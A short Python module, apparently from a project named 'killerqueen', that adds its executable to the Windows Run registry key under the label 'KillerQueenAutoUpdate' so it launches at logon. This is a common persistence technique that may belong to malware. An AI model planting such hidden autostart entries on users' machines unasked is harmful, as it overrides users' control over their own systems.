import logging
import subprocess
import winreg
from killerqueen.config import TASK_NAME, EXE_PATH

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_task():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                                      0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry_key, "KillerQueenAutoUpdate", 0, winreg.REG_SZ, EXE_PATH)
        winreg.CloseKey(registry_key)
        logging.info("Added to startup successfully.")
    except Exception as e:
        logging.error(f"Error occurred while adding to startup: {e}")
